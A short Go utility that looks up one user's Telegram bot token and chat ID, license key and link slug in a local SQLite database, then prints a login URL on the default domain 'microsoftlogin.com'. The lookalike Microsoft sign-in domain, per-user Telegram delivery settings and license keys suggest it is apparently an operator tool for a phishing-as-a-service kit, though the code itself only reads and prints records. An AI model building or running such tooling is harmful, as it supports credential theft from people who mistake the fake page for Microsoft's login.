package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: go run main.go <user_id>")
	}
	userID := os.Args[1]
	dbPath := filepath.Join(".", "config.db")

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatalf("❌ Failed to open DB: %v", err)
	}
	defer db.Close()

	// Telegram settings
	var botToken, chatID string
	err = db.QueryRow(`SELECT bot_token, chat_id FROM telegram_settings WHERE user_id = ?`, userID).Scan(&botToken, &chatID)
	if err == sql.ErrNoRows {
		fmt.Println("📭 Telegram settings not found.")
	} else if err != nil {
		log.Fatalf("❌ Telegram query error: %v", err)
	} else {
		fmt.Println("📬 Telegram settings found:")
		fmt.Printf("  Bot Token: %s\n  Chat ID: %s\n", botToken, chatID)
	}

	// License key
	var key string
	err = db.QueryRow(`SELECT key FROM license_keys WHERE user_id = ?`, userID).Scan(&key)
	if err == sql.ErrNoRows {
		fmt.Println("🔑 License key not found.")
	} else if err != nil {
		log.Fatalf("❌ License key query error: %v", err)
	} else {
		fmt.Println("🔐 License key found:")
		fmt.Printf("  Key: %s\n", key)
	}

	// Link slug
	var slug string
	err = db.QueryRow(`SELECT slug FROM user_links WHERE user_id = ?`, userID).Scan(&slug)
	if err == sql.ErrNoRows {
		fmt.Println("🔗 No link found.")
	} else if err != nil {
		log.Fatalf("❌ Link query error: %v", err)
	} else {
		domain := os.Getenv("DOMAIN")
		if domain == "" {
			domain = "microsoftlogin.com"
		}
		url := fmt.Sprintf("https://login.%s/%s", domain, slug)
		fmt.Println("🔗 Link found:")
		fmt.Printf("  Slug: %s\n  URL: %s\n", slug, url)
	}
}
